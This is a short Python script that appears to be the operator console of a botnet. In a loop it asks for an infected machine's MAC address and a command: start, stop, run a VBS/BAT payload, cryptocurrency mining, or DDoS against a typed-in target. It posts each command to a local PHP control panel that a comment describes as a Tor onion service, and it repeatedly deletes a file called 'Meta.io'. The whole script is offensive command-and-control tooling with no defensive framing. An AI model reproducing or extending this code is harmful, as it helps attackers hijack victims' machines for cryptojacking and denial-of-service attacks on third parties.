import requests
import time
import os



# Clear screen and display banner
os.system("clear")
os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Meta | lolcat")
os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Network | lolcat")



file_to_delete = "Meta.io" 

if os.path.exists(file_to_delete):
    os.remove(file_to_delete)


while True:
    mac = input("Enter Mac: ")
    option = input("(START/STOP/STARTVBSBAT/MINING/DDOS) : ")

    if option == "DDOS":
        target = input("Target >>> : ")
    else:
        target = ""

    # Define the Tor onion service URL
    tor_url = 'http://127.0.0.1:8080/Metasploit.php'
    if option == "DDOS":
     data = {'MAC': mac, 'Option': option,'Target': target}
    else:
     data = {'MAC': mac, 'Option': option}
    try:
        response = requests.post(tor_url, data=data)
        if response.status_code == 200:
            print("Data sent successfully.")
        else:
            print("Failed to send data.")
            time.sleep(5)
    except Exception as e:
        print(f"Error: {str(e)}")

    time.sleep(10)
    file_to_delete = "Meta.io"  

    if os.path.exists(file_to_delete):
     os.remove(file_to_delete)

